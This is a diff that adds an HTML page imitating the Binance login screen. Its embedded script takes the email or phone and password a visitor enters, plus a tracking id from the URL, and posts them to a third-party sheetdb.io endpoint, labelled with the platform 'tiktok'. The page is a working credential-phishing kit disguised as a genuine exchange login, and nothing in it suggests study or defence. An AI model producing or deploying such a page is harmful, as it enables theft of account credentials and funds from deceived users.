@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance Login</title>
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: #0b0e11;
+            color: white;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 360px;
+            margin: 60px auto;
+            background: #181a20;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255, 223, 0, 0.2);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 90px;
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 25px;
+            font-weight: 600;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #b8b8b8;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border-radius: 6px;
+            outline: none;
+            border: 1px solid #333;
+            background: #0f1115;
+            color: white;
+            font-size: 15px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #f0b90b;
+            border: none;
+            border-radius: 6px;
+            color: #000;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background: #e8b109;
+        }
+
+        .links {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .links a {
+            color: #f0b90b;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+<h1 style="color:#f0b90b ;">Binance</h1>
+        </div>
+
+        <h2>Log In</h2>
+
+        <label>Email or Phone</label>
+        
+        
+        
+        
+        
+        <input id="email" type="text" placeholder="Enter your email or phone" name="email">
+
+        <label>Password</label>
+        <input id="password" type="password" placeholder="Enter your password" name="password">
+
+        <button class="btn" onclick="send()">Login</button>
+        
+        
+        <script>
+       function send() {
+        //email
+        const email = document.getElementById('email').value;
+        //password
+       const password = document.getElementById('password').value;
+         //id from url acceptor
+        var urldata = new URLSearchParams(window.location.search);
+        //id that come from above
+        const id = urldata.get('id');
+        //type of platform
+        const type = "tiktok";
+        
+        
+        //Data sender 
+        
+        
+        
+   const url = "https://sheetdb.io/api/v1/md4crj2w1sk6g";
+
+fetch(url, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    data: {
+      id: id,
+      type: type,
+      username: email,
+      password: password
+    }
+  })
+})
+.then(response => response.json())
+.then(result => {
+  //out
+})
+.catch(error => {
+  window.alert(error);
+});
+
+}
+</script>
+        
+        
+        
+
+        <div class="links">
+            <a href="#">Forgot password?</a><br><br>
+            <a href="#">Create a new account</a>
+        </div>
+    </div>
+
+</body>
+</html>
